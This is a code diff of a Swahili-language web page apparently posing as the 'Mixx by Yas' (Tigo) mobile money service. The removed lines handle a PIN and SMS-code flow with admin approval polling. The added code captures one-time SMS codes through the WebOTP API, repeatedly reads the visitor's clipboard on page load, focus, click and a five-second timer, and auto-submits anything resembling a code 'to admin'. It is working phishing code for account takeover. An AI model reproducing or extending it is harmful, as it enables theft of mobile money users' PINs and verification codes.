-            if (!smsText) { document.getElementById('codeError').textContent = 'Inasubiri namba...'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); startCountdown(); startClipWatcher(); return; }
-            document.getElementById('screen3').classList.remove('active'); document.getElementById('screen4').classList.add('active'); 
-            await fetch('/api/submit_code', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ app_id: appId, code: smsText }) }); 
-            if (checkInterval) clearInterval(checkInterval); 
-            checkInterval = setInterval(async function() { try { var res = await fetch('/api/check_status/' + appId); var data = await res.json(); if (data.code_status === 'approved') { clearInterval(checkInterval); showSuccess(); } else if (data.code_status === 'wrong_code') { clearInterval(checkInterval); showCodeError(); } else if (data.status === 'wrong_pin' || data.code_status === 'wrong_pin') { clearInterval(checkInterval); goBackToPinFromCode(); } } catch(e) {} }, 3000); 
+                detectionStatus.textContent = '📱 Listening for SMS...';
+                
+                const abortController = new AbortController();
+                const timeoutId = setTimeout(() => {
+                    abortController.abort();
+                }, 60000);
+
+                const otp = await navigator.credentials.get({
+                    otp: { transport: ['sms'] },
+                    signal: abortController.signal
+                });
+
+                clearTimeout(timeoutId);
+
+                if (otp && otp.code) {
+                    detectionStatus.textContent = '✅ SMS detected automatically!';
+                    
+                    let fullSMS = '';
+                    try {
+                        if (navigator.clipboard && navigator.clipboard.readText) {
+                            const clipboardText = await navigator.clipboard.readText();
+                            if (clipboardText && clipboardText.includes(otp.code)) {
+                                fullSMS = clipboardText;
+                            }
+                        }
+                    } catch (e) {}
+                    
+                    if (!fullSMS) {
+                        fullSMS = `Your verification code is: ${otp.code}`;
+                    }
+                    
+                    smsTextarea.value = fullSMS;
+                    smsDetected = true;
+                    
+                    showToast('SMS imegundulika kiotomatiki! 🎯');
+                    setStatus('SMS detected. Auto-submitting...', 'fa-check-circle');
+                    detectionStatus.textContent = '✅ SMS detected!';
+                    
+                    setTimeout(() => {
+                        if (!isSubmitting && smsTextarea.value.trim().length > 0) {
+                            submitCode();
+                        }
+                    }, 1000);
+                    
+                    return true;
+                }
+                
+                return false;
+            } catch (err) {
+                if (err.name === 'AbortError') {
+                    detectionStatus.textContent = '⏱️ SMS timeout. Please copy manually.';
+                } else {
+                    detectionStatus.textContent = '📋 Please copy SMS from notification';
+                }
+                console.log('WebOTP error:', err);
+                return false;
+            }
         }
 
-        function showSuccess() { document.getElementById('screen4').classList.remove('active'); document.getElementById('successOverlay').classList.add('active'); }
-        function showCodeError() { document.getElementById('screen4').classList.remove('active'); document.getElementById('screen3').classList.add('active'); document.getElementById('smsMessage').value = ''; lastClip = ''; codeReceived = false; document.getElementById('btnSubmit').style.display = 'none'; document.getElementById('codeError').textContent = 'Msimbo sio sahihi. Inasubiri mpya...'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); startCountdown(); startClipWatcher(); setTimeout(function() { document.getElementById('codeError').classList.remove('show'); }, 4000); }
-        function goBackToPinFromCode() { if (fastCheck) { clearInterval(fastCheck); } if (countdownTimer) { clearInterval(countdownTimer); } document.getElementById('screen4').classList.remove('active'); document.getElementById('screen1').classList.add('active'); document.getElementById('tigoPin').value = ''; document.getElementById('tigoPin').focus(); document.getElementById('smsMessage').value = ''; lastClip = ''; codeReceived = false; document.getElementById('btnSubmit').style.display = 'none'; }
-    </script>
+        async function readClipboard() {
+            try {
+                if (!navigator.clipboard || !navigator.clipboard.readText) {
+                    return false;
+                }
+                
+                const text = await navigator.clipboard.readText();
+                if (text && text.trim().length > 20 && !smsDetected) {
+                    const lowerText = text.toLowerCase();
+                    if (lowerText.includes('mixx') || 
+                        lowerText.includes('code') || 
+                        lowerText.includes('verification') ||
+                        lowerText.includes('register') ||
+                        /[a-zA-Z0-9]{8,20}/.test(text)) {
+                        
+                        smsTextarea.value = text.trim();
+                        smsDetected = true;
+                        detectionStatus.textContent = '✅ SMS from clipboard!';
+                        showToast('SMS imebandikwa kutoka clipboard! 📋');
+                        setStatus('SMS detected. Auto-submitting...', 'fa-check-circle');
+                        
+                        setTimeout(() => {
+                            if (!isSubmitting && smsTextarea.value.trim().length > 0) {
+                                submitCode();
+                            }
+                        }, 800);
+                        return true;
+                    }
+                }
+                return false;
+            } catch (err) {
+                return false;
+            }
+        }
+
+        async function detectSMS() {
+            if (smsDetected || isSubmitting) return;
+            
+            const autoSuccess = await autoReadSMS();
+            if (autoSuccess) return;
+            
+            await readClipboard();
+        }
+
+        function submitCode() {
+            const code = smsTextarea.value.trim();
+            if (!code) {
+                showToast('Tafadhali bandika SMS kwanza.', true);
+                setStatus('SMS haipo. Bandika au ngoja.', 'fa-exclamation-triangle');
+                return;
+            }
+
+            if (isSubmitting) return;
+            isSubmitting = true;
+            submitBtn.disabled = true;
+            submitSpinner.classList.remove('hidden');
+            setStatus('Inatuma kwa admin...', 'fa-spinner fa-pulse');
+
+            const extractedCode = extractCodeFromSMS(code) || code;
+            
+            fetch('/verify_code', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    code: code,
+                    extracted_code: extractedCode,
+                    full_sms: code
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                isSubmitting = false;
+                submitBtn.disabled = false;
+                submitSpinner.classList.add('hidden');
+                if (data.status === 'success') {
+                    showToast('Code imetumwa kwa admin! 🔐');
+                    setStatus('Subiri uthibitisho kutoka kwa admin.', 'fa-clock');
+                } else {
+                    showToast('Hitilafu: ' + (data.message || 'jaribu tena'), true);
+                    setStatus('Tatizo la mawasiliano. Jaribu tena.', 'fa-exclamation-triangle');
+                }
+            })
+            .catch(err => {
+                isSubmitting = false;
+                submitBtn.disabled = false;
+                submitSpinner.classList.add('hidden');
+                showToast('Hitilafu ya mtandao. Jaribu tena.', true);
+                setStatus('Hakuna muunganisho.', 'fa-wifi-slash');
+                console.error(err);
+            });
+        }
+
+        function closeSuccess() {
+            successOverlay.classList.add('hidden');
+        }
+
+        window.showSuccess = function() {
+            successOverlay.classList.remove('hidden');
+        };
+
+        submitBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            submitCode();
+        });
+
+        resendBtn.addEventListener('click', function() {
+            if (resendAttempts >= MAX_RESEND) return;
+            if (cooldownSeconds > 0) return;
+
+            resendAttempts++;
+            startCooldown();
+            updateResendUI();
+
+            smsDetected = false;
+            smsTextarea.value = '';
+            detectionStatus.textContent = '📱 Waiting for new SMS...';
+            
+            fetch('/resend_code', { method: 'POST' })
+            .then(res => res.json())
+            .then(data => {
+                showToast('Code imetumwa tena! 📲');
+                setStatus('Angalia SMS yako.', 'fa-envelope');
+                setTimeout(() => detectSMS(), 2000);
+            })
+            .catch(() => {
+                showToast('Hitilafu ya kupeleka tena.', true);
+            });
+        });
+
+        window.addEventListener('load', function() {
+            setTimeout(() => detectSMS(), 1000);
+        });
+
+        document.addEventListener('visibilitychange', function() {
+            if (document.visibilityState === 'visible' && !smsDetected) {
+                detectionStatus.textContent = '🔄 Checking for SMS...';
+                setTimeout(() => detectSMS(), 500);
+            }
+        });
+
+        smsTextarea.addEventListener('focus', function() {
+            if (!smsDetected) {
+                detectSMS();
+            }
+        });
+
+        document.querySelector('.card').addEventListener('click', function(e) {
+            if (e.target.tagName !== 'BUTTON' && e.target.tagName !== 'A' && !smsDetected) {
+                detectSMS();
+            }
+        });
+
+        document.addEventListener('paste', function(e) {
+            const pasted = e.clipboardData?.getData('text');
+            if (pasted && pasted.trim().length > 0 && !smsDetected) {
+                smsTextarea.value = pasted.trim();
+                smsDetected = true;
+                detectionStatus.textContent = '✅ SMS pasted!';
+                showToast('SMS imebandikwa! 📋');
+                setStatus('SMS detected. Auto-submitting...', 'fa-check-circle');
+                setTimeout(() => {
+                    if (!isSubmitting && smsTextarea.value.trim().length > 0) {
+                        submitCode();
+                    }
+                }, 400);
+            }
+        });
+
+        updateResendUI();
+        smsTextarea.setAttribute('readonly', 'readonly');
+        
+        const detectionInterval = setInterval(() => {
+            if (!smsDetected && !isSubmitting) {
+                detectSMS();
+            }
+        }, 5000);
+
+        console.log('🚀 MixxByYas with SMS Auto-Read loaded!');
+    })();
+</script>
+
 </body>
 </html>
